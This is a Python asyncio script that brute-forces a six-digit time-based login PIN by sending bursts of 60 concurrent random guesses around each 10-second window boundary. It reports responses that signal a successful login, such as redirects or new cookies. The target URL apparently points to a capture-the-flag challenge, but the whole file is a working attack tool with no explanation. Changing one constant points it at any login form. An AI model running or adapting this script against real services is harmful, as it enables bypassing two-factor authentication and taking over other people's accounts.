import asyncio
import aiohttp
import random
import time

TARGET = "https://dumb-factor-authentication-02f57162f3b02631-global.challs.brunnerne.xyz/login"   # <-- set this
CONCURRENCY = 60                       # requests per burst
WINDOW_SECONDS = 10                    # TOTP window boundary. 10s as this is "custom made"
PRE_BOUNDARY_LEAD = 2.0                # start bursting this many seconds before boundary
BURST_DURATION = 4.0                   # keep bursting this many seconds around the boundary

def random_pin():
    return f"{random.randint(0, 999999):06d}"

async def try_pin(session, pin):
    try:
        async with session.post(TARGET, data={"pin": pin}, allow_redirects=False, timeout=5) as resp:
            body = await resp.text()
            is_invalid_page = "Invalid PIN" in body
            set_cookie = resp.headers.get("Set-Cookie")
            interesting = (resp.status in (301, 302, 303) and "login" not in resp.headers.get("Location", "")) \
                          or set_cookie is not None \
                          or (resp.status == 200 and not is_invalid_page)
            if interesting:
                print(f"[!!!] pin={pin} status={resp.status} location={resp.headers.get('Location')} "
                      f"set-cookie={set_cookie} len={len(body)}")
                return True
    except Exception as e:
        print(f"[error] pin={pin}: {e}")
    return False

async def burst(session, pins):
    tasks = [try_pin(session, p) for p in pins]
    results = await asyncio.gather(*tasks)
    return any(results)

async def boundary_race():
    async with aiohttp.ClientSession() as session:
        while True:
            now = time.time()
            next_boundary = (int(now // WINDOW_SECONDS) + 1) * WINDOW_SECONDS
            wait = next_boundary - now - PRE_BOUNDARY_LEAD
            if wait > 0:
                await asyncio.sleep(wait)

            print(f"\n[+] Bursting around boundary {next_boundary} (T-{PRE_BOUNDARY_LEAD}s to T+{BURST_DURATION-PRE_BOUNDARY_LEAD}s)")
            end_time = time.time() + BURST_DURATION
            found = False
            while time.time() < end_time and not found:
                pins = [random_pin() for _ in range(CONCURRENCY)]
                found = await burst(session, pins)
            if found:
                print("[+] Hit — check output above for the winning request.")
                return

if __name__ == "__main__":
    asyncio.run(boundary_race())